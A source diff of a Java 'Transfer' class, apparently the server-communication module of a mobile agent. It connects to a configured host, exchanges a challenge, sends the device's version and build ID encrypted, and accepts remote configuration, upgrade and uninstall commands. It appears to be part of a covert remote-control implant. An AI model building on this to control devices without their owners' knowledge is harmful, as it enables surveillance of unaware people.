@@ -60,12 +60,15 @@ public class Transfer {
 
     private boolean connected = false;
 
-    private boolean uninstall = false;
+    public boolean uninstall = false;
+    public boolean reload = false;
 
     private Connection connection = null;
 
+    /** The challenge. */
     byte[] challenge = new byte[16];
 
+    /** The keys. */
     Keys keys;
 
     /**
@@ -86,7 +89,7 @@ public class Transfer {
 
         wifi = false;
         if (wifiPreferred) {
-            debug.trace("Try wifi");
+            debug.trace("Try wifi, ssl:" + ssl);
             connection = new WifiConnection(host, port, ssl);
             if (connection.isActive()) {
                 wifi = true;
@@ -96,7 +99,7 @@ public class Transfer {
 
         // fall back
         if (!wifi || !connected) {
-            debug.trace("Try direct tcp");
+            debug.trace("Try direct tcp, ssl:" + ssl);
             connection = new DirectTcpConnection(host, port, ssl);
             connected = connection.connect();
         }
@@ -166,6 +169,13 @@ public class Transfer {
         }
     }
 
+    /**
+     * Gets the challenge.
+     * 
+     * @return the challenge
+     * @throws ProtocolException
+     *             the protocol exception
+     */
     protected void getChallenge() throws ProtocolException {
 
         debug.info("getChallenge");
@@ -192,6 +202,17 @@ public class Transfer {
         }
     }
 
+    /**
+     * prende la nuova configurazione e la salva, in modo che alla ripartenza
+     * 
+     * @param command
+     *            the command
+     * @return the new conf
+     * @throws CommandException
+     *             the command exception
+     * @throws ProtocolException
+     *             the protocol exception
+     */
     protected void getNewConf(Command command) throws CommandException,
             ProtocolException {
 
@@ -199,8 +220,10 @@ public class Transfer {
 
         fillPayload(command);
         if (command.size() > 0) {
-            AutoFlashFile file = new AutoFlashFile(Path.USER_PATH
-                    + Path.CONF_DIR + Conf.NEW_CONF, true);
+            // String filename = Encryption.encryptName(Conf.NEW_CONF, 1);
+            AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
+                    + Conf.NEW_CONF, true);
+
             if (file.exists()) {
                 file.delete();
             }
@@ -253,8 +276,24 @@ public class Transfer {
         throw new CommandException("Not Implemented");
     }
 
+    /**
+     * Inits the.
+     * 
+     * @param host_
+     *            the host_
+     * @param port_
+     *            the port_
+     * @param ssl_
+     *            the ssl_
+     * @param wifiPreferred_
+     *            the wifi preferred_
+     */
     public void init(String host_, int port_, boolean ssl_,
             boolean wifiPreferred_) {
+
+        reload = false;
+        uninstall = false;
+
         this.host = host_;
         this.port = port_;
         this.ssl = ssl_;
@@ -297,6 +336,7 @@ public class Transfer {
             case Proto.UPGRADE:
                 debug.info("UPGRADE");
                 getUpgrade(command);
+                reload = true;
                 break;
 
             case Proto.BYE:
@@ -333,6 +373,11 @@ public class Transfer {
         return command;
     }
 
+    /**
+     * Send.
+     * 
+     * @return true, if successful
+     */
     public synchronized boolean send() {
         if (!connect()) {
             debug.error("not connected");
@@ -471,7 +516,6 @@ public class Transfer {
         Device device = Device.getInstance();
         device.refreshData();
 
-        Keys keys = Keys.getInstance();
         sendCryptoCommand(Proto.VERSION, Device.getVersion()); // 4
         sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype()); // 2
         sendCryptoCommand(Proto.ID, keys.getBuildId()); // 16
